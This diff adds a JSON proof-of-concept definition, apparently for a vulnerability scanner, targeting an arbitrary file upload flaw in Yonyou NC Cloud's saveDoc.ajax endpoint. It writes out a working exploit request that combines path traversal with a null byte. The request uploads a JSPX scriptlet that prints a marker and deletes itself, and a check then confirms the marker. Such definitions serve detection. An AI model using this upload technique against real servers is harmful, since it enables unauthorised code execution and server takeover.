@@ -1,0 +1,37 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud saveDoc.ajax任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友NC Cloud saveDoc.ajax任意文件上传漏洞，攻击者可通过此漏洞上传恶意脚本文件，对服务器的正常运行造成安全威胁！",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_52204925/article/details/136499668",
+  "fix": [
+    "请联系厂商进行修复或者升级到安全版本"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/uapws/saveDoc.ajax?ws=/../../52e039302a62d077.jspx%00",
+      "data": {
+        "content": "<hi xmlns:hi=\"http://java.sun.com/JSP/Page\">\n      <hi:directive.page import=\"java.util.*,java.io.*,java.net.*\"/>\n   <hi:scriptlet>\n            out.println(\"95cc64dd2825f9df13ec4ad683ecf339\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); \n   </hi:scriptlet>\n</hi>"
+      }
+    },
+    "verify": {
+      "path": "/uapws/52e039302a62d077.jspx",
+      "logic": "and",
+      "check": [
+        {
+          "body": "95cc64dd2825f9df13ec4ad683ecf339"
+        }
+      ]
+    }
+  }
+}
